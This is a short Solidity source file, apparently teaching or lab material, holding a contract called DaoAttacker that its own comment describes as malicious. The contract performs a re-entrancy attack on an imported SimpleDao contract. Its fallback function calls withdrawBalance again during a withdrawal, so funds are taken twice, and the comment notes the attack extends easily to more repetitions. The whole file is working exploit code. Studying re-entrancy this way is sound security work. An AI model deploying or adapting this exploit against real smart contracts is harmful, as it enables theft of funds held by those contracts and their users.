pragma solidity ^0.4.23;

import "./SimpleDao.sol";


/*This is the malicious contract that implements a re-entrant attack
 * to the simplified dao contract. This attack can be carried out 2 times,
 * but can be easily extended for n executions.
 */
contract DaoAttacker{


    bool is_attack;
    SimpleDao dao;

    constructor(SimpleDao _dao) public {
        dao = _dao;
    }

    function() public payable {
        if (is_attack==true) {
            is_attack=false;
            dao.withdrawBalance();
        }
    }

    function contribute() payable public {
        dao.contribute.value(msg.value)();
    }

    function attack() public {
        is_attack = true;
        dao.withdrawBalance();
    }
}